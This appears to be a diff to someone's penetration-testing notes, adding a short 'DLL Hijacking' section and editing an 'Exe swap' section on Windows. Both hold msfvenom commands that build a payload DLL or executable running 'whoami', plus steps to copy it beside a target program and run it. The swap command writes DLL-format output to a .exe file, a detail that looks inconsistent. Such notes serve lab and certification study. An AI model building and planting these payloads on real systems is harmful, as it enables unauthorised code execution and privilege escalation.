@@ -439,13 +439,19 @@ head/tail
 ```
 
 #  DLL Hijacking
+only option if cannot rename exe
+```
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\users\admin\Desktop\whoami.txt' -f dll > SSPICLI.dll
+```
+scp dll to dir where exe is found and run exe
+
 
 #  Exe swap
 can only be done if able to rename executable
 ```
-msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\users\admin\Desktop\whoami.txt' -f dll > SSPICLI.dll 
+msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > c:\users\admin\Desktop\whoami.txt' -f dll > SSPICLI.exe
 ```
-
+scp the newly made exe to target and run
 
 
 
